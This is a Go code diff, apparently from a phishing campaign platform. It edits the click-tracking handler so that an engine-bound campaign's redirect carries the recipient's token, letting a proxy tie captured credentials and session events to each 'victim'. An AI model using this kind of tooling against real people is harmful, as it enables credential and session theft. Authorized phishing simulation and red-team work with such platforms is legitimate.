@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"errors"
 	"net/http"
+	"net/url"
 
 	"github.com/go-chi/chi/v5"
 	"github.com/google/uuid"
@@ -201,17 +202,38 @@ func (s *Server) campaignLinks(w http.ResponseWriter, r *http.Request) {
 func (s *Server) trackClick(w http.ResponseWriter, r *http.Request) {
 	rec, err := s.recipients.GetByToken(r.Context(), s.pool, chi.URLParam(r, "token"))
 	if err != nil {
-		s.notFoundPage(w)
+		// Unknown token: neutral page, no state change, no information leak.
+		s.neutralPage(w)
 		return
 	}
+
 	s.recordTracking(r, rec, events.TypeClicked)
 
-	landing, err := s.campaigns.LandingURLByID(r.Context(), s.pool, rec.CampaignID)
+	landing, engineID, err := s.campaigns.LandingRedirectByID(r.Context(), s.pool, rec.CampaignID)
 	if err == nil && landing != nil && *landing != "" {
-		http.Redirect(w, r, *landing, http.StatusFound)
+		target := *landing
+		if engineID != nil {
+			// Engine-bound campaign: carry the victim token through so the
+			// proxy can attribute captured creds/session events. Plain
+			// (non-engine) landings never receive the token.
+			target = appendQueryParam(target, "_pft", rec.Token)
+		}
+		http.Redirect(w, r, target, http.StatusFound)
 		return
 	}
 	s.neutralPage(w)
+}
+
+// appendQueryParam appends key=value to a URL, preserving existing params.
+func appendQueryParam(rawURL, key, value string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return rawURL
+	}
+	q := u.Query()
+	q.Set(key, value)
+	u.RawQuery = q.Encode()
+	return u.String()
 }
 
 func (s *Server) trackOpen(w http.ResponseWriter, r *http.Request) {
